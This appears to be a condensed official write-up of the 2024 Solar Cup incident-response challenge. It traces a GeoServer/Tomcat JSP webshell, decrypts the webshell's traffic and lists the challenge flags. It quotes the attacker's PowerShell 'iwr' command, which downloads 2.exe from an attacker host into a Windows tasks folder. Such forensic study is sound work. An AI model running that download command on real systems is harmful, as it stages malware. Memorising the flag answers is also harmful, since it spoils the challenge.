---
title: 【官方WP】第一届 solar 杯·应急响应挑战赛官方题解
contest: solar杯
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [应急响应, Solar-Cup, GeoServer, Tomcat-JSP, webshell, 流量解密, 333.exe, 勒索病毒]
attack_chain: 1. 攻击者 IP 10.0.100.22 目录扫描 + b.jsp 上传/2. Tomcat work/Catalina/.../org/apache/jsp/ 找动态生成 class/3. xc 作为解密密钥解密流量/4. 删除无用部分另存为 pdf/5. 333.exe 工具使 10.0.11.6 与 10.0.11.10 TCP 连接
key_payload: xc 解密密钥  GeoServer b.jsp  333.exe  flag{sA4hP_89dFh_x09tY_lL4SI4}
one_liner: 第一届 Solar 杯应急响应挑战赛官方 WP，GeoServer 入侵 + Tomcat JSP 动态类 + 流量解密 + 333.exe 工具。
lesson: 应急响应三大模块：流量分析 + 文件排查 + webshell 还原；Tomcat work 目录是 JSP 动态类缓存；xc 作为密钥解密流量。
quality: high
---

# 【官方WP】第一届 solar 杯·应急响应挑战赛官方题解

## 概览
第一届 Solar 杯应急响应挑战赛官方 WP，GeoServer 入侵场景 + Tomcat JSP 动态类 + 流量解密。

## 1. 流量分析

### 1.1 文件排查
- 攻击者 IP: 10.0.100.22
- 目录扫描 + b.jsp 上传 webshell
- 路径: `<Tomcat_home>/work/Catalina/<host>/<webapp>/org/apache/jsp/`
- Tomcat 动态编译 .class 文件缓存

### 1.2 流量解密
- 提取访问 webshell 的 pcapng
- 用 webshell 文件中的 `xc` 作解密密钥
- 筛选发现攻击者查看了 flag 文件

### 1.3 流量还原
- 解密流量 + 删无用部分
- 另存为 pdf

### 1.4 PE 镜像分析
- 镜像下载: https://www.hotpe.top/download/
- 攻击命令: `powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe`
- 24/12/18 16:37:14 攻击者用 333.exe 工具

## flag
- `f!l^a*g{A7b4_X9zK_2v8N_wL5q4}` (noise flag)
- `flag{sA4hP_89dFh_x09tY_lL4SI4}` (真 flag)
- `flag{dD7g_jk90_jnVm_aPkcs}`
- `flag{2024/12/16 15:24:21}`

## 经验提炼
- 应急响应三大模块：流量分析 + 文件排查 + webshell 还原
- Tomcat work 目录是 JSP 动态类缓存
- `xc` 作为密钥解密流量
- 333.exe 是端口扫描/工具
- powershell iwr 是 Windows 下载执行常见手法
- GeoServer 是 Java 开源 GIS 服务器
- webshell 攻击链：上传 + 访问 + 命令执行 + 持久化
- iwr -uri -OutFile 简写 -o
- 时间戳 + 工具名 + 内网 IP 是 IOC 关键
- Solar 杯是国内应急响应赛事
